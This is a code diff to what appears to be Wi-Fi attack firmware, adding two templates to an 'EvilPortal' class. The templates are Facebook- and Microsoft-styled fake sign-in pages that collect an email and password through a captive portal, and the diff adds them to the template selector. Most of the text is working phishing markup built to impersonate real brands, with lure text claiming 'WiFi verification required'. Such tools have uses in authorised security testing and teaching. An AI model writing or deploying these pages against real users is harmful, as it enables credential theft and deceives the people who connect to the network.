@@ -234,6 +234,49 @@ static const char PORTAL_HTML_GOOGLE[] PROGMEM = R"rawliteral(
 </html>
 )rawliteral";
 
+// Facebook-style login page
+static const char PORTAL_HTML_FACEBOOK[] PROGMEM = R"rawliteral(
+<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{font-family:Helvetica,Arial;background:#f0f2f5;margin:0}
+.wrap{max-width:396px;margin:80px auto;padding:20px}
+.logo{color:#1877f2;font-size:42px;font-weight:700;text-align:center;margin-bottom:16px}
+.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);padding:20px}
+input{width:100%;padding:14px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px;box-sizing:border-box}
+button{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;margin-top:6px}
+.divider{border-top:1px solid #dadde1;margin:20px 0}
+</style></head><body><div class="wrap"><div class="logo">facebook</div><div class="card">
+<form action="/login" method="POST">
+<input name="email" placeholder="Email or phone number" required>
+<input name="password" type="password" placeholder="Password" required>
+<input type="hidden" name="ssid" value="%SSID%">
+<button type="submit">Log In</button>
+</form><div class="divider"></div>
+<p style="text-align:center;color:#65676b;font-size:14px">Secure login - WiFi verification required</p>
+</div></div></body></html>
+)rawliteral";
+
+// Microsoft-style login page
+static const char PORTAL_HTML_MICROSOFT[] PROGMEM = R"rawliteral(
+<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{font-family:Segoe UI,Arial;background:#f2f2f2;margin:0;display:flex;justify-content:center;align-items:center;height:100vh}
+.card{background:#fff;width:440px;max-width:90%;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
+.logo{font-size:24px;font-weight:600;margin-bottom:16px}
+.ms{color:#737373;font-size:15px;margin-bottom:24px}
+input{width:100%;padding:10px 8px;margin:8px 0;border:none;border-bottom:1px solid #666;font-size:15px;box-sizing:border-box;outline:none}
+input:focus{border-bottom:2px solid #0067b8}
+button{padding:10px 40px;background:#0067b8;color:#fff;border:none;font-size:15px;cursor:pointer;float:right;margin-top:16px}
+a{color:#0067b8;font-size:13px;text-decoration:none}
+</style></head><body><div class="card"><div class="logo">Microsoft</div>
+<div class="ms">Sign in to your account</div>
+<form action="/login" method="POST">
+<input name="email" placeholder="Email, phone, or Skype" required>
+<input name="password" type="password" placeholder="Password" required>
+<input type="hidden" name="ssid" value="%SSID%">
+<br><a href="#">Forgot password?</a>
+<button type="submit">Sign in</button>
+</form></div></body></html>
+)rawliteral";
+
 // Success page after login
 static const char SUCCESS_HTML[] PROGMEM = R"rawliteral(
 <!DOCTYPE html>
@@ -591,6 +634,12 @@ String EvilPortal::getPortalHtml() {
         case PortalTemplate::GOOGLE:
             html = FPSTR(PORTAL_HTML_GOOGLE);
             break;
+        case PortalTemplate::FACEBOOK:
+            html = FPSTR(PORTAL_HTML_FACEBOOK);
+            break;
+        case PortalTemplate::MICROSOFT:
+            html = FPSTR(PORTAL_HTML_MICROSOFT);
+            break;
         case PortalTemplate::CUSTOM:
             if (m_customHtml.length() > 0) {
                 html = m_customHtml;
@@ -611,6 +660,16 @@ String EvilPortal::getPortalHtml() {
 
 String EvilPortal::getSuccessHtml() {
     return FPSTR(SUCCESS_HTML);
+}
+
+const char* EvilPortal::getTemplateHtml(PortalTemplate tpl) {
+    switch (tpl) {
+        case PortalTemplate::FACEBOOK:   return PORTAL_HTML_FACEBOOK;
+        case PortalTemplate::MICROSOFT:  return PORTAL_HTML_MICROSOFT;
+        case PortalTemplate::GOOGLE:     return PORTAL_HTML_GOOGLE;
+        case PortalTemplate::GENERIC_WIFI:
+        default:                         return PORTAL_HTML_GENERIC;
+    }
 }
 
 } // namespace Vanguard
